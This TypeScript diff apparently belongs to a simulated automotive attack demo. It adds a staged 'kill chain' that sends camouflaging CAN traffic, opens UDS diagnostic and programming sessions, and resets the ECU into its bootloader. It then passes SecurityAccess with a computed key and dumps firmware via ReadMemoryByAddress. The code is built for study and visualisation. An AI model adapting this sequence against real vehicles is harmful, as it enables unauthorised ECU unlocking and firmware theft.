+    const startUs = log.length === 0 ? 0 : log[log.length - 1].timestampUs;
+    return { name, description, startUs, endUs: startUs, framesStart: log.length, framesEnd: log.length };
+  };
+  const phaseEnd = (p: KillChainPhaseLog) => {
+    p.endUs = log.length === 0 ? p.startUs : log[log.length - 1].timestampUs;
+    p.framesEnd = log.length;
+    phases.push(p);
+    opts.onPhase?.(p);
+  };
+
+  const totalSteps =
+    busFrames /* phase 1 */ +
+    1 /* DSC ext */ +
+    1 /* DSC prog */ +
+    1 /* ECUReset */ +
+    1 /* DSC prog post-reset */ +
+    2 /* SecurityAccess */ +
+    Math.ceil(dumpTotal / chunk); /* dump chunks */
+  let stepsDone = 0;
+  const tickProgress = (msg: string) => {
+    stepsDone += 1;
+    opts.onProgress?.(stepsDone / totalSteps, msg);
+  };
+
+  // ── Phase 1: bus conditioning ───────────────────────────────────
+  {
+    const p = phaseStart('bus_conditioning', 'Benign powertrain frames to mimic real bus traffic.');
+    for (let i = 0; i < busFrames; i++) {
+      const fid = 0x100 + (i & 0x3); // rotate among 0x100..0x103
+      const data = new Uint8Array(8);
+      // Simulated RPM/speed rolling pattern
+      const rpm = 700 + ((i * 17) % 200);
+      const spd = (i * 3) % 60;
+      data[0] = (rpm >> 8) & 0xff;
+      data[1] = rpm & 0xff;
+      data[2] = spd & 0xff;
+      data[3] = (i & 0xff);
+      data[4] = 0x00;
+      data[5] = 0x00;
+      data[6] = 0x00;
+      data[7] = 0x00;
+      bus.sendFromTester({ id: fid, data });
+      tickProgress(`bus conditioning ${i + 1}/${busFrames}`);
+    }
+    phaseEnd(p);
+  }
+
+  // ── Phase 2: enter extended diagnostic session ──────────────────
+  {
+    const p = phaseStart('dsc_extended', 'UDS 0x10 sub=0x03 — Extended Diagnostic Session.');
+    const resp = await tester.request(Uint8Array.from([UDS_SID.DiagnosticSessionControl, 0x03]));
+    if (resp[0] !== UDS_SID.DiagnosticSessionControl + 0x40) {
+      throw new Error('DSC extended: negative response: ' + bytesToHex(resp));
+    }
+    tickProgress('DSC extended');
+    phaseEnd(p);
+  }
+
+  // ── Phase 3: enter programming session ─────────────────────────
+  {
+    const p = phaseStart('dsc_programming', 'UDS 0x10 sub=0x02 — Programming Session.');
+    const resp = await tester.request(Uint8Array.from([UDS_SID.DiagnosticSessionControl, 0x02]));
+    if (resp[0] !== UDS_SID.DiagnosticSessionControl + 0x40) {
+      throw new Error('DSC programming: negative response: ' + bytesToHex(resp));
+    }
+    tickProgress('DSC programming');
+    phaseEnd(p);
+  }
+
+  // ── Phase 4: ECU reset → enter bootloader ──────────────────────
+  {
+    const p = phaseStart('ecu_reset_bootloader', 'UDS 0x11 sub=0x02 — KeyOffOnReset → bootloader.');
+    const resp = await tester.request(Uint8Array.from([UDS_SID.ECUReset, 0x02]));
+    if (resp[0] !== UDS_SID.ECUReset + 0x40) {
+      throw new Error('ECUReset: negative response: ' + bytesToHex(resp));
+    }
+    if (!bootloader.isActive()) {
+      throw new Error('ECUReset: bootloader did not enter active mode');
+    }
+    tickProgress('ECU reset → bootloader');
+    phaseEnd(p);
+  }
+
+  // ── Phase 5: re-enter programming session inside bootloader ────
+  {
+    const p = phaseStart(
+      'dsc_programming_post_reset',
+      'UDS 0x10 sub=0x02 — re-establish session after reset (now in bootloader).',
+    );
+    const resp = await tester.request(Uint8Array.from([UDS_SID.DiagnosticSessionControl, 0x02]));
+    if (resp[0] !== UDS_SID.DiagnosticSessionControl + 0x40) {
+      throw new Error('DSC post-reset: negative response: ' + bytesToHex(resp));
+    }
+    tickProgress('DSC post-reset');
+    phaseEnd(p);
+  }
+
+  // ── Phase 6: security access (request seed + send key) ─────────
+  {
+    const p = phaseStart('security_access', 'UDS 0x27 sub=0x01 (seed) + sub=0x02 (key).');
+    const seedResp = await tester.request(Uint8Array.from([UDS_SID.SecurityAccess, 0x01]));
+    if (seedResp[0] !== UDS_SID.SecurityAccess + 0x40) {
+      throw new Error('SecurityAccess seed: negative response: ' + bytesToHex(seedResp));
+    }
+    if (seedResp[1] !== 0x01) {
+      throw new Error('SecurityAccess seed: unexpected sub-fn echo: ' + hex2(seedResp[1]));
+    }
+    const seed = seedResp.slice(2);
+    if (seed.length !== 4) {
+      throw new Error(`SecurityAccess seed: unexpected seed length ${seed.length}`);
+    }
+    const computeKey = opts.computeKey ?? defaultComputeKey;
+    const key = u32ToBytes(computeKey(new Uint32Array([bytesToU32(seed)]))[0]);
+    const keyResp = await tester.request(
+      Uint8Array.from([UDS_SID.SecurityAccess, 0x02, ...key]),
+    );
+    if (keyResp[0] !== UDS_SID.SecurityAccess + 0x40) {
+      throw new Error('SecurityAccess key: negative response: ' + bytesToHex(keyResp));
+    }
+    if (server.getSecurityLevel() !== 1) {
+      throw new Error('SecurityAccess: server still locked');
+    }
+    tickProgress('Security unlocked');
+    phaseEnd(p);
+  }
+
+  // ── Phase 7: ReadMemoryByAddress loop ───────────────────────────
+  const firmware = new Uint8Array(dumpTotal);
+  {
+    const p = phaseStart(
+      'firmware_dump',
+      `UDS 0x23 ALFID=0x44 — ${Math.ceil(dumpTotal / chunk)} chunks of ${chunk} B.`,
+    );
+    let cursor = 0;
+    while (cursor < dumpTotal) {
+      const thisChunk = Math.min(chunk, dumpTotal - cursor);
+      const addr = dumpStart + cursor;
+      // ALFID 0x44 = 4-byte size, 4-byte address
+      const req = new Uint8Array(2 + 4 + 4);
+      req[0] = UDS_SID.ReadMemoryByAddress;
+      req[1] = 0x44;
+      req[2] = (addr >>> 24) & 0xff;
+      req[3] = (addr >>> 16) & 0xff;
+      req[4] = (addr >>> 8) & 0xff;
+      req[5] = addr & 0xff;
+      req[6] = (thisChunk >>> 24) & 0xff;
+      req[7] = (thisChunk >>> 16) & 0xff;
+      req[8] = (thisChunk >>> 8) & 0xff;
+      req[9] = thisChunk & 0xff;
+      const resp = await tester.request(req, 10000);
+      if (resp[0] !== UDS_SID.ReadMemoryByAddress + 0x40) {
+        throw new Error(
+          `ReadMemoryByAddress @0x${hex8(addr)}: negative response ${bytesToHex(resp)}`,
+        );
+      }
+      const data = resp.slice(1);
+      if (data.length !== thisChunk) {
+        throw new Error(
+          `ReadMemoryByAddress @0x${hex8(addr)}: expected ${thisChunk} B, got ${data.length}`,
+        );
+      }
+      firmware.set(data, cursor);
+      cursor += thisChunk;
+      tickProgress(
+        `dump ${Math.floor((cursor / dumpTotal) * 100)}% (${cursor}/${dumpTotal} B)`,
+      );
+    }
+    phaseEnd(p);
+  }
+
+  // FNV-1a hash of the dump for quick equality checks
+  let h = 0x811c9dc5;
+  for (let i = 0; i < firmware.length; i++) {
+    h ^= firmware[i];
+    h = Math.imul(h, 0x01000193) >>> 0;
+  }
+
+  const totalDurationUs = log.length === 0 ? 0 : log[log.length - 1].timestampUs;
+
+  // Cleanup
+  testerStack.reset();
+  ecuStack.reset();
+
+  return {
+    log,
+    phases,
+    firmware,
+    firmwareHash: h >>> 0,
+    totalDurationUs,
+    totalFrames: log.length,
+    bootloader,
+  };
+}
+
+/** Convert a kill-chain log into a CSV string matching the data/uds_demo_*.csv schema. */
+export function killChainLogToCsv(log: KillChainCanLog[]): string {
+  const lines: string[] = ['timestamp_us,can_id,direction,dlc,data_hex,decoded_uds_service'];
+  for (const e of log) {
+    const dataHex = bytesToHex(e.data, '');
+    const decoded = e.decoded.replace(/,/g, ';');
+    const dirShort = e.direction === 'tester→ecu' ? 'TX' : 'RX';
+    lines.push(
+      `${e.timestampUs},0x${hex4(e.canId)},${dirShort},${e.dlc},${dataHex},${decoded}`,
+    );
   }
   return lines.join('\n');
 }
 
-/** Decode a UDS service id to a short text label for the CSV. */
-export function decodeUdsLabel(payload: Uint8Array): string {
-  if (payload.length === 0) return '';
-  const sid = payload[0];
-  if (sid === 0x7F) {
-    return `NegResp SID=0x${payload[1]?.toString(16)} NRC=0x${payload[2]?.toString(16)}`;
-  }
-  // strip response bit if present
-  const reqSid = sid >= 0x40 ? sid - 0x40 : sid;
-  const dir = sid >= 0x40 ? '+' : '';
-  const map: Record<number, string> = {
-    0x10: 'DSC', 0x11: 'ECUReset', 0x14: 'ClearDTC', 0x19: 'ReadDTC',
-    0x22: 'ReadDID', 0x23: 'ReadMem', 0x27: 'SecAccess', 0x2E: 'WriteDID',
-    0x31: 'Routine', 0x34: 'ReqDownload', 0x36: 'TransferData', 0x37: 'ReqXferExit',
-    0x3E: 'TesterPresent',
-  };
-  return `${dir}${map[reqSid] || `0x${reqSid.toString(16)}`}`;
+/** Helper for the UI: format us → "ss.mmm s". */
+export function formatUs(us: number): string {
+  const ms = us / 1000;
+  if (ms < 1000) return `${ms.toFixed(1)} ms`;
+  return `${(ms / 1000).toFixed(2)} s`;
 }
